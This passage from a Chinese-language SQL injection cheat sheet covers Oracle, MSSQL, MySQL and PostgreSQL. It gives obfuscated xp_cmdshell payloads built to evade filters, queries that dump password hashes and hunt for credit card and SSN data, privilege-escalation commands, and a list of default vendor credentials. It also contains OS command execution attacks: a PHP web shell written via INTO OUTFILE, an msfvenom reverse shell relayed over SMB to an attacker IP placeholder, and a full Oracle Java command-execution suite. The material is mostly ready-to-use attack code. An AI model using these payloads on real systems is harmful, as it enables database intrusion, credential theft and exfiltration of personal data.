`SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9;` -- Returns 9th row

有些数据库要求给（select ***） 加上别名，例如：

`SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) as aaa WHERE r=9;`

- Bitwise AND	
`SELECT bitand(6,2) FROM dual;` -- Returns 2

`SELECT bitand(6,1) FROM dual;` -- Returns 0

- String Concatenation	

`SELECT 'A' || 'B' FROM dual;` -- Returns AB

- Avoiding Quotes	

`SELECT chr(65) || chr(66) FROM dual;` -- Returns AB

- Hex Encoding	

`SELECT 0x75736572 FROM dual;`

#### ms sql

- ASCII > Char	
`SELECT char(65)`
- Char > ASCII	
`SELECT ascii('A')`

- Hex > Int	

`SELECT 0x20 + 0x40`

- Bitwise AND	
`SELECT 6 & 2`

- Bitwise OR	
`SELECT 6 | 2`

- Bitwise Negation	
`SELECT ~6`

- Bitwise XOR	
`SELECT 6 ^ 2`

- Substring	
`SELECT substring('abcd', 3, 2)`

substring(string, index, length)

- Casting	
`SELECT cast('1' AS unsigned integer)`

`SELECT cast('123' AS char)`

- Concatenation	
`SELECT concat('net','spi')`

- Comments	
`SELECT 1 --comment`

`SELECT/*comment*/1`

- Avoiding Quotes	
`SELECT char(65)+char(66)` -- returns AB
- Avoid semicolon with %0d	
`%0dwaitfor+delay+'0:0:10'--`

- Bypass Case Filtering	
`EXEC xP_cMdsheLL 'dir';`

- Avoid Spaces - With Comments	

`EXEC/**/xp_cmdshell/**/'dir';--'`

`;ex/**/ec xp_cmds/**/hell 'dir';`

- Avoid Query Detection - with concatenation	
`DECLARE @cmd as varchar(3000);SET @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";exec(@cmd);`

- Avoid Query Detection - Char Encoding	
`DECLARE @cmd as varchar(3000);SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);`

- Avoid Query Detection - Base64 Encoding	
`DECLARE @data varchar(max), @XmlData xml;SET @data = 'ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn';SET @XmlData = CAST('' + @data + '' as xml);SET @data = CONVERT(varchar(max), @XmlData.value('(data)[1]', 'varbinary(max)'));exec (@data);`

- Avoid Query Detection - Nchar Encoding	
`DECLARE @cmd as nvarchar(3000);SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+nchar(101)+nchar(114)+nchar(46)+nchar(46)+nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)+nchar(100)+nchar(115)+nchar(104)+nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)+nchar(105)+nchar(114)+nchar(39)+nchar(59));EXEC(@cmd);`

- Avoid Query Detection - Binary Encoded ASCII + CAST	
`DECLARE @cmd as varchar(MAX);SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));exec(@cmd);`

- Avoid Query Detection - Binary Encoded ASCII + CONVERT	
`DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);exec(@cmd);`

- Avoid Query Detection - varbinary(MAX)	
`DECLARE @cmd as varchar(MAX);SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec(@cmd);`

- Avoid EXEC() - sp_sqlexec	
`DECLARE @cmd as varchar(3000);SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);exec sp_sqlexec @cmd;`

- Execute xp_cmdshell 'dir'	
`DECLARE @tmp as varchar(MAX);SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+char(68)+char(83)+char(72)+char(69)+char(76)+char(76);exec @tmp 'dir';`

## 攻击查询

一旦发现可注入的参数并判断出DBMS的类型，我们下一步就是攻击数据库。下面有一些提升权限（escalating），获取数据的内容（exfiltrating data）。

### 信息收集
有价值的信息包括：测试环境、版本号、用户账户、数据库等有可能利用的漏洞信息。

#### MYSQL
- Version	 
`SELECT @@version`

- User	
`SELECT user()`
`SELECT system_user()`

- Users	
`SELECT user FROM mysql.user`

`SELECT Super_priv FROM mysql.user WHERE user= 'root' LIMIT 1,1`

- Tables
`SELECT table_schema, table_name FROM information_schema.tables`

- Columns	
`SELECT table_name, column_name FROM information_schema.columns`

- Databases	
`SELECT schema_name FROM information_schema.schemata`

- Current Database Name	
`SELECT database()`

- Query another Database	
`USE [database_name]; SELECT database();`

`SELECT [column] FROM [database_name].[table_name]`

- Number of Columns	
`SELECT count(*) FROM information_schema.columns WHERE table_name = '[table_name]'`

- DBA Accounts	
`SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'`

- Password Hashes	
`SELECT host, user, password FROM mysql.user`

- Schema	
`SELECT schema()`

- Path to Data	
`SELECT @@datadir`

- Read Files(需要权限)
`SELECT LOAD_FILE('/etc/passwd')`

#### oracle
- Version	

`SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`

`SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`

`SELECT version FROM v$instance;`
- User	

`SELECT user FROM dual`
- Users	

`SELECT username FROM all_users ORDER BY username;`

`SELECT name FROM sys.user$;`需要权限

- Tables	

`SELECT table_name FROM all_tables;`

`SELECT owner, table_name FROM all_tables;`

- Tables From Column Name	
`SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';`

- Columns	
`SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';`

`SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';`

- Current Database	
`SELECT global_name FROM global_name;`

`SELECT name FROM V$DATABASE;`

`SELECT instance_name FROM V$INSTANCE;`

`SELECT SYS.DATABASE_NAME FROM DUAL;`
- Databases	
`SELECT DISTINCT owner FROM all_tables;`

- DBA Accounts
`SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';`

- Privileges	
`SELECT * FROM session_privs;(Retrieves Current Privs)`

`SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';` 需要权限

`SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';`需要权限

`SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;`

- Location of DB Files	
`SELECT name FROM V$DATAFILE;`

- Hostname, IP Address	
`SELECT UTL_INADDR.get_host_name FROM dual;`

`SELECT host_name FROM v$instance;`

`SELECT UTL_INADDR.get_host_address FROM dual; (Gets IP Address)`

`SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; (Gets Hostnames)`

#### ms sqlserver
Description	Query
Version	SELECT @@version;
User	SELECT user;
SELECT system_user;
SELECT user_name();
SELECT loginame from master..sysprocesses where spid = @@SPID
Users	SELECT name from master..syslogins
Tables	SELECT table_catalog, table_name FROM information_schema.columns
Columns	SELECT table_catalog, column_name FROM information_schema.columns
Databases	SELECT name from master..sysdatabases;
Database Name	SELECT db_name();
Server Name	SELECT @@SERVERNAME
Find Stored Procedures	SELECT * from master..sysobjects where name like 'sp%' order by name desc
Principal Id from username	SELECT SUSER_ID('sa')
Username from Principal Id	SELECT SUSER_NAME(1)
Check if Account is Admin	IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))
SELECT is_srvrolemember('sysadmin');
Policies	SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id
Domain User	https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql
DB Audits	SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id
Server Audits	SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id
Query history	SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),'Ad-Hoc') AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,
(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2)
ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC
Enabled audit specifications	https://gist.github.com/nullbind/5da8b5113da007ba0111
Local Administrators in Sysadmin Role	SELECT is_srvrolemember('sysadmin','BUILTIN\Administrators')
Domain users and LDAP queries via database links and openrowset	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-SQLDomainUser-Example.sql

#### postgreSQL
Description	Query
Version	SELECT version();
User	SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
Users	SELECT usename FROM pg_user
User Password Hashes	SELECT usename, passwd FROM pg_shadow
Privileges	SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
List DBA Accounts	SELECT usename FROM pg_user WHERE usesuper IS TRUE
Current Database	SELECT current_database()
Databases	SELECT datname FROM pg_database
Tables	SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)
Tables from Column Names	SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)
Columns	SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)
Find Stored Procedures	SELECT proname
FROM pg_catalog.pg_namespace n
JOIN pg_catalog.pg_proc p
ON pronamespace = n.oid
WHERE nspname = 'public';
Comments	SELECT 1; –comment
SELECT /*comment*/1;
Server Name	
Host Name	select inet_server_addr()
Listening Port	select inet_server_port();
List Settings	SELECT * FROM pg_settings;

####

### 数据定位（targeting）
如果能够正确的瞄准和识别敏感数据，将指数级的减少测试时间。

#### mysql

##### 数据定位（瞄准）查询
Description	Query
- Database sizes	
`select table_schema "Database Name",sum(data_length+index_length)/1024/1024, "Database Size in MB",sum(data_free)/1024/1024,"Free Space in MB"   from information_schema.TABLES group by table_schema;`

- Database name keyword	

`SELECT table_schema “Database Name" FROM information_schema.TABLES WHERE table_schema LIKE “%passwords%" GROUP BY table_schema ;`

- Table name keyword	
`SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE “information_schema" AND table_name LIKE “%admin%“;`

- Column name keyword

`SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE “%password%“;`

- Column data regex	`SELECT * from credit_cards WHERE cc_number REGEXP '^4[0-9]{15}$';`


##### 数据定位正则式
Description	Regex
- All major credit card providers	

`^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$`

- Unmasked | Masked SSN	
`^(\d{3}-?\d{2}-?\d{4}|XXX-XX-XXXX)$`

##### 数据定位关键字
```
credit
card
pin
cvv
pan
password
social
ssn
account
confidential
```

#### oracle
##### 数据定位（瞄准）查询
- Finding Sensitive Data
`SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';`

- Finding Privileges	
```
SELECT * FROM session_privs
SELECT * FROM USER_SYS_PRIVS
SELECT * FROM USER_TAB_PRIVS
SELECT * FROM USER_TAB_PRIVS_MADE
SELECT * FROM USER_TAB_PRIVS_RECD
SELECT * FROM ALL_TAB_PRIVS
SELECT * FROM USER_ROLE_PRIVS
```

- Extracting stored procedure/Java sources	

```
SELECT * FROM all_source WHERE owner NOT IN ('SYS','SYSTEM')

SELECT * FROM all_source WHERE TYPE LIKE '%JAVA %'

SELECT TO_CHAR(DBMS_METADATA.get_ddl('TABLE','DEPT','CONSUELA')) FROM dual
```
##### 数据定位正则式
- All major credit card providers	
`^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$`

- Unmasked | Masked SSN	
`^(\d{3}-?\d{2}-?\d{4}|XXX-XX-XXXX)$`
##### 数据定位关键字
```
credit
card
pin
cvv
pan
password
social
ssn
account
confidential
```

#### sql server
##### 数据定位（瞄准）查询

- List non-default databases	

`SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE 'distribution') AND (NAME NOT LIKE 'master') AND (NAME NOT LIKE 'model') AND (NAME NOT LIKE 'msdb') AND (NAME NOT LIKE 'publication') AND (NAME NOT LIKE 'reportserver') AND (NAME NOT LIKE 'reportservertempdb') AND (NAME NOT LIKE 'resource') AND (NAME NOT LIKE 'tempdb') ORDER BY NAME;`

- List non-default tables	

`SELECT '[' + SCHEMA_NAME(t.schema_id) + '].[' + t.name + ']' AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid < 2 WHERE (ROWS> 0) AND (t.name NOT LIKE 'syscolumns') AND (t.name NOT LIKE 'syscomments') AND (t.name NOT LIKE 'sysconstraints') AND (t.name NOT LIKE 'sysdepends') AND (t.name NOT LIKE 'sysfilegroups') AND (t.name NOT LIKE 'sysfiles') AND (t.name NOT LIKE 'sysforeignkeys') AND (t.name NOT LIKE 'sysfulltextcatalogs') AND (t.name NOT LIKE 'sysindexes') AND (t.name NOT LIKE 'sysindexkeys') AND (t.name NOT LIKE 'sysmembers') AND (t.name NOT LIKE 'sysobjects') AND (t.name NOT LIKE 'syspermissions') AND (t.name NOT LIKE 'sysprotects') AND (t.name NOT LIKE 'sysreferences') AND (t.name NOT LIKE 'systypes') AND (t.name NOT LIKE 'sysusers') ORDER BY TABLE_NAME;`

- Column name search	

`SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like '%password%'`

- List non-default columns	

`SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH > 14 AND DATA_TYPE NOT IN ('bigint','binary','bit','cursor','date','datetime','datetime2', 'datetimeoffset','float','geography','hierarchyid','image','int','money','real', 'smalldatetime','smallint','smallmoney','sql_variant','table','time','timestamp', 'tinyint','uniqueidentifier','varbinary','xml') AND TABLE_NAME='CreditCard' OR CHARACTER_MAXIMUM_LENGTH < 1 AND DATA_TYPE NOT IN ( 'bigint', 'binary', 'bit', 'cursor', 'date', 'datetime', 'datetime2', 'datetimeoffset', 'float', 'geography', 'hierarchyid', 'image', 'int', 'money', 'real', 'smalldatetime', 'smallint', 'smallmoney', 'sql_variant', 'table', 'time', 'timestamp', 'tinyint', 'uniqueidentifier', 'varbinary', 'xml') AND TABLE_NAME='CreditCard' ORDER BY COLUMN_NAME;`

- Search for transparent encryption	

`SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1`

- Search by database size	

`SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC`

##### 数据定位正则式
- All major credit card providers	
`^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$`

- Unmasked | Masked SSN	
`^(\d{3}-?\d{2}-?\d{4}|XXX-XX-XXXX)$`
##### 数据定位关键字
```
credit
card
pin
cvv
pan
password
social
ssn
account
confidential
```

### 权限提升（privilege escalation）
#### oracle

- Dump All DBA Usernames	

`SELECT username FROM user_role_privs WHERE granted_role='DBA';`

- Make User DBA	* 

`GRANT DBA to USER`

- Create Procedure	

```
CREATE OR REPLACE PROCEDURE “SYSTEM".netspi1 (id IN VARCHAR2)
AS
PRAGMA autonomous_transaction;
EXECUTE IMMEDIATE 'grant dba to scott';
COMMIT;
END;

BEGIN
SYSTEM.netspi1('netspi');
END;
```

- Find Database Links	

```
SELECT * FROM DBA_DB_LINKS
SELECT * FROM ALL_DB_LINKS
SELECT * FROM USER_DB_LINKS
```

- Query Database Links	

```
SELECT * FROM sales@miami -- minimum for preconfigured

SELECT * FROM harold@netspi.com -- standard usage for selecting table from schema on remote server

SELECT * FROM harold@netspi.com@hq_1 -- standard usage for selecting table from schema on remote server instance

SELECT db_link,password FROM user_db_links WHERE db_link LIKE 'TEST%''

SELECT name,password FROM sys.link$ WHERE name LIKE 'TEST%';

SELECT name,passwordx FROM sys.link$ WHERE name LIKE 'TEST%';
```

- Execute stored procedures on database links	

```
EXEC mySchema.myPackage.myProcedure@myRemoteDB( 'someParameter' );

SELECT dbms_xmlquery.getxml('select * from emp') FROM harold@netspi.com
```
- Creating database links	

```
CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; -- connected user setup

CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; -- standard defined user/pass

CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING 'string_to_hq_1'; -- instance specific

CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING 'us_supply'; -- defined user/pass
```

- Removing Links	
`DROP DATABASE LINK miami;`

#### mssqlserver

- Make User DBA	* 
`EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';`

- Grant Execute on All Custom Objects	
```
SELECT 'grant exec on ' + QUOTENAME(ROUTINE_SCHEMA) + '.' +
QUOTENAME(ROUTINE_NAME) + ' TO test' FROM INFORMATION_SCHEMA.ROUTINES
WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'IsMSShipped') = 0 ;
```

- Grant Execute on All Store Procedures	
```
CREATE ROLE db_executor
GRANT EXECUTE TO db_executor
exec sp_addrolemember 'db_executor', 'YourSecurityAccount'
```

- UNC Path Injection	https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e
https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/

- Detect Impersonatable logins	

`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`

- Impersonate Login
Note: REVERT will bring you back to your original login.	
`EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;`

- Create sysadmin user	* 
```
USE [master]
GO
CREATE LOGIN [test] WITH PASSSWORD=N 'test', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
GO
EXEC master..sp_addsrvrolemember @loginame=N'test', @rolename=N'sysadmin'
GO
```
- Create sysadmin user	* 
`EXEC sp_addlogin 'user', 'pass';`
`EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';`
- Drop User	* 
`EXEC sp_droplogin 'user';`
- Retrieve SQL Agent Connection Passwords	
```
exec msdb.dbo.sp_get_sqlagent_properties
Retrieve DTS Connection Passwords	select msdb.dbo.rtbldmbprops
```
- Get sysadmin as local admin	https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/
- Startup stored procedures	https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/
- Trigger creation	https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
- Windows auto-logon passwords	https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/
- xp_regwrite non-sysadmin execution	https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e
- Stored procedures with trustworthy databases https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases
- Stored procedure user impersonation	https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/


- Default passwords	
```
sa:sa
sa:[empty]
[username]:[username]
```
- Default passwords for instances (Instance name, User, Pass)
```
"ACS","ej","ej"
"ACT7","sa","sage"
"AOM2","admin","ca_admin"
"ARIS","ARIS9","*ARIS!1dm9n#"
"AutodeskVault","sa","AutodeskVault@26200" "BOSCHSQL","sa","RPSsql12345"
"BPASERVER9","sa","AutoMateBPA9"
"CDRDICOM","sa","CDRDicom50!"
"CODEPAL","sa","Cod3p@l"
"CODEPAL08","sa","Cod3p@l"
"CounterPoint","sa","CounterPoint8"
"CSSQL05","ELNAdmin","ELNAdmin"
"CSSQL05","sa","CambridgeSoft_SA"
"CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!"
"DHLEASYSHIP","sa","DHLadmin@1"
"DPM","admin","ca_admin"
"DVTEL","sa",""
"EASYSHIP","sa","DHLadmin@1"
"ECC","sa","Webgility2011"
"ECOPYDB","e+C0py2007_@x","e+C0py2007_@x"
"ECOPYDB","sa","ecopy"
"Emerson2012","sa","42Emerson42Eme"
"HDPS","sa","sa"
"HPDSS","sa","Hpdsdb000001"
"HPDSS","sa","hpdss"
"INSERTGT","msi","keyboa5"
"INSERTGT","sa",""
"INTRAVET","sa","Webster#1"
"MYMOVIES","sa","t9AranuHA7"
"PCAMERICA","sa","pcAmer1ca"
"PCAMERICA","sa","PCAmerica"
"PRISM","sa","SecurityMaster08"
"RMSQLDATA","Super","Orange"
"RTCLOCAL","sa","mypassword"
"SALESLOGIX","sa","SLXMaster"
"SIDEXIS_SQL","sa","2BeChanged"
"SQL2K5","ovsd","ovsd"
"SQLEXPRESS","admin","ca_admin"
"STANDARDDEV2014","test","test" "TEW_SQLEXPRESS","tew","tew"
"vocollect","vocollect","vocollect"
"VSDOTNET","sa",""
"VSQL","sa","111"
```
### 执行OS命令
通过sql注入执行os命令是一个主要目标，这有助于获得主机os控制权。

#### mysql
- Command Execution (PHP)	*需要权限
`SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'`

- Command Execution with MySQL CLI Access	https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/

##### SMB RELAY SHELL
需要：metasploit和smbrelayx

- 生成反弹shellpayload
例如：
`msfvenom -p windows/meterpreter/reverse_tcp LHOHST=YOUR_TEAMSERVER.IP LPORT=443 -f exe > reverse_shell.exe`

- 生成监听器来投递反弹shell

`smbrelayx.py -h VICTIM.IP -e ./reverse_shell.exe`

- 执行下面任意MYSQL查询，调用监听器
```
select load_file('\\\\YOUR.IP.GOES.HERE\\aa');

select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'netspi' into dumpfile '\\\\YOUR.IP.GOES.HERE\\aa';

select 'netspi' into outfile '\\\\YOUR.IP.GOES.HERE\\aa';

load data infile '\\\\YOUR.IP.GOES.HERE\\aa' into table database.table_name;
```
更多信息可参考[Here](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)。

#### oracle

##### 若已安装java，则可用于执行命令。例如：
```sql
--
-- $Id: raptor_oraexec.sql,v 1.2 2006/11/23 23:40:16 raptor Exp $
--
-- raptor_oraexec.sql - java exploitation suite for oracle
-- Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
--
-- This is an exploitation suite for Oracle written in Java. Use it to
-- read/write files and execute OS commands with the privileges of the
-- RDBMS, if you have the required permissions (DBA role and SYS:java).
--
-- "The Oracle RDBMS could almost be considered as a shell like bash or the
-- Windows Command Prompt; it's not only capable of storing data but can also
-- be used to completely access the file system and run operating system 
-- commands" -- David Litchfield (http://www.databasesecurity.com/)
--
-- Usage example:
-- $ sqlplus "/ as sysdba"
-- [...]
-- SQL> @raptor_oraexec.sql
-- [...]
-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l > /tmp/aaa');
-- SQL> exec javawritefile('/tmp/mytest', '/bin/ls -l / > /tmp/bbb');
-- SQL> exec dbms_java.set_output(2000);
-- SQL> set serveroutput on;
-- SQL> exec javareadfile('/tmp/mytest');
-- /bin/ls -l > /tmp/aaa
-- /bin/ls -l / >/tmp/bbb
-- SQL> exec javacmd('/bin/sh /tmp/mytest');
-- SQL> !sh
-- $ ls -rtl /tmp/
-- [...]
-- -rw-r--r--   1 oracle   system        45 Nov 22 12:20 mytest
-- -rw-r--r--   1 oracle   system      1645 Nov 22 12:20 aaa
-- -rw-r--r--   1 oracle   system      8267 Nov 22 12:20 bbb
-- [...]
--

create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
	/*
	 * Command execution module
	 */
	public static void execCommand(String command) throws IOException
	{
		Runtime.getRuntime().exec(command);
	}

	/*
	 * File reading module
	 */
	public static void readFile(String filename) throws IOException
	{
		FileReader f = new FileReader(filename);
		BufferedReader fr = new BufferedReader(f);
		String text = fr.readLine();
		while (text != null) {
			System.out.println(text);
			text = fr.readLine();
		}
		fr.close();
	}

	/*
	 * File writing module
	 */
	public static void writeFile(String filename, String line) throws IOException
	{
		FileWriter f = new FileWriter(filename, true); /* append */
		BufferedWriter fw = new BufferedWriter(f);
		fw.write(line);
		fw.write("\n");
		fw.close();
	}
}
/

-- usage: exec javacmd('command');
create or replace procedure javacmd(p_command varchar2) as
language java           
name 'oraexec.execCommand(java.lang.String)';
/

-- usage: exec dbms_java.set_output(2000);
--        set serveroutput on;
--        exec javareadfile('/path/to/file');
create or replace procedure javareadfile(p_filename in varchar2) as
language java
name 'oraexec.readFile(java.lang.String)';
/

-- usage: exec javawritefile('/path/to/file', 'line to append');
create or replace procedure javawritefile(p_filename in varchar2, p_line in varchar2) as
language java
name 'oraexec.writeFile(java.lang.String, java.lang.String)';
/
```

##### Creating Java Classes	

```sql
/* create Java class */
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
END;
/

BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

上面的java类展开看如下：
```java
import java.io.*; 

public class PwnUtil{ 
  public static String runCmd(String args){ 
    try{ 
      BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));
      String stemp, str = "";
      while ((stemp = myReader.readLine()) != null) 
        str += stemp + "\n";
      myReader.close();
      return str;
    } 
    catch (Exception e){ 
      return e.toString();}
    } 
    
  public static String readFile(String filename){ 
    try{ 
